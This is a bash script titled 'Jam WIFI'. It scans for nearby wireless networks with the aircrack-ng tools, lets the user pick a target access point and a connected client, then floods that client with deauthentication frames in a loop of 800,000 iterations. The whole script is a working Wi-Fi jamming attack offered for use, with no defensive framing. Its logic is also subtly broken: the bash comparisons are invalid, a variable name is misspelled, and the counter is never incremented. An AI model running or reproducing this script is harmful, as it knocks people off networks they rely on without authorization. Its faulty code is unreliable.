#!/bin/bash


echo -e "\e[34m############################################\e[0m"
echo -e "\e[34m# Jam WIFI                                 #\e[0m"
echo -e "\e[34m# Script by\e[0m \e[40;38;5;82m Add3r \e[30;48;5;82m, Version 1.0  #\e[0m"
echo -e "\e[34m############################################\e[0m"
echo " "

echo -n "Initializing to Monitor mode"
airmon-ng start wlan0
echo -n "Enter your attackname : "
read name
airodump-ng -w $name mon0
echo -e "The targets in your range \n"
cat $name-01.csv | grep -a 54 | cut -d',' -f 14
echo -n "Who's your target ? : "
read target

first=$(cat $name-01.csv | grep $target | cut -d"," -f 1)
echo $first #echo simple
second=$(cat $name-01.kismet.netxml | grep "BSSID" | cut -d">" -f 2 | cut -d"<" -f 1)
echo $second #echo simple
for i in $first;do
        for j in $second;do
                if(i==j)
                then
                        bssid=$j
                fi
        done
done
targetbss=$bssid
echo $tagetbss #echo simple
#targetbss=$(cat $name-01.csv | grep $target | cut -d"," -f 1)
echo "Target BSS Identified"

chan=$(cat $name-01.csv | grep $target | cut -d"," -f 4 | head -1)
echo $chan #echo simple
echo $target #echo simple
echo " Target channel identified"
airodump-ng -w $target -c $chan -d $targetbss mon0
touch $target.txt
cat $target-01.csv | grep $targetbss | cut -d"," -f 1 | grep -v $targetbss > $target.txt
echo -e "Clients associated to the Access Point\n"
cat -n $target.txt
echo -n "Choose your client to deauth : "
read choice
deauth(){
for((i=0;i<800000;i++))
do
	aireplay-ng -0 1 -a $targetbss -c $die -e $target --ignore-negative-one mon0
done
}
n=1
for num in $(cat $target.txt);do
	if(n==choice)
	then
		die=$num
		deauth
	else
		$n+1
	fi
done 
